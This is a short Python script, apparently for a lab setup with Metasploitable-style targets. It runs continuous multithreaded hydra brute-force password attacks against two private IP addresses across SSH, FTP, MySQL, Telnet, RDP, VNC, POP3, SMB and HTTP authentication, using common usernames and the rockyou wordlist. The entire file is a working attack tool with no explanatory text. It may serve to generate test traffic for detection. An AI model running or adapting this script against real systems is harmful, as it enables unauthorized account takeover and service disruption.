#!/usr/bin/env python3
import subprocess
import random
import time
import threading

# Targets
TARGETS = ["192.168.56.105", "192.168.56.101"]

# Users to try
USERNAMES = ["root", "admin", "msfadmin", "user"]

# Path to your wordlist
WORDLIST = "/home/enoch/Downloads/rockyou.txt"

# Define brute force scenarios
def build_hydra_command(target, service, username):
    if service == "ssh":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            f"ssh://{target}",
            "-t", "4"
        ]
    elif service == "ftp":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "ftp",
            "-t", "4"
        ]
    elif service == "mysql":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "mysql",
            "-t", "4"
        ]
    elif service == "telnet":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "telnet",
            "-t", "4"
        ]
    elif service == "rdp":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "rdp",
            "-V",
            "-t", "2"
        ]
    elif service == "vnc":
        return [
            "hydra",
            "-P", WORDLIST,
            target,
            "vnc",
            "-t", "4"
        ]
    elif service == "pop3":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "pop3",
            "-t", "4"
        ]
    elif service == "smb":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "smb",
            "-t", "4"
        ]
    elif service == "http-get":
        return [
            "hydra",
            "-l", username,
            "-P", WORDLIST,
            target,
            "http-get",
            "/protected/",
            "-t", "4"
        ]

# Worker thread to run continuous brute force attacks
def brute_worker():
    while True:
        target = random.choice(TARGETS)
        service = random.choice([
            "ssh", "ftp", "mysql",
            "telnet", "rdp", "vnc",
            "pop3", "smb", "http-get"
        ])
        username = random.choice(USERNAMES)
        cmd = build_hydra_command(target, service, username)
        print(f"[*] Running: {' '.join(cmd)}")
        subprocess.run(cmd)

if __name__ == "__main__":
    try:
        # Launch multiple threads for parallel brute force
        num_threads = 3
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=brute_worker, daemon=True)
            t.start()
            threads.append(t)

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("[*] Stopping continuous brute force attacks.")
